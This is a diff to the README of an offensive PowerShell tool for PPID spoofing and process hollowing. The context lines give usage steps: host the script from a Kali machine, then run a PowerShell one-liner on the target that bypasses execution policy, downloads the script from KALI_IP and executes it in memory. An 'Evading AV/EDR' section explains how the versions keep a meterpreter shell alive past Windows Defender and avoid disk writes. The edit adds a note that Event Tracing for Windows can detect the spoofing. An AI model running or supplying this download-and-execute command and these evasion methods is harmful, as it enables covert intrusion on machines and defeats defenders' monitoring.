@@ -45,10 +45,12 @@ YouTube (higher resolution): https://www.youtube.com/watch?v=GB59m-KJvd0
 3. Host the script on your kali `python3 -m http.server 8088`
 4. On your target machine `powershell -ep Bypass -c IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8088/Reflective-PPIDxProcHollow_v1.2.ps1')`
 
+## Disclaimer
+As we are performing parent process ID spoofing, it can be detected via Event Tracing for Windows (EWT).
 
 ## Evading AV/EDR
 - The v1.0 script creates an alert on Windows Defender upon launching cmd.exe from meterpreter shell. However, your meterpreter shell will still be **kept alive** despite the alert.
-- The v1.1 script eradicates the issue of v1.0 and it also makes the process looks more legitimate by spawning it under another parent process through PPID Spoofing. However, EWT can still catch PPID Spoofing method.
+- The v1.1 script eradicates the issue of v1.0 and it also makes the process looks more legitimate by spawning it under another parent process through PPID Spoofing. 
 - The v1.2 script evades more AV/EDR due to it not touching disk at all 😁
 
 ## Change Logs
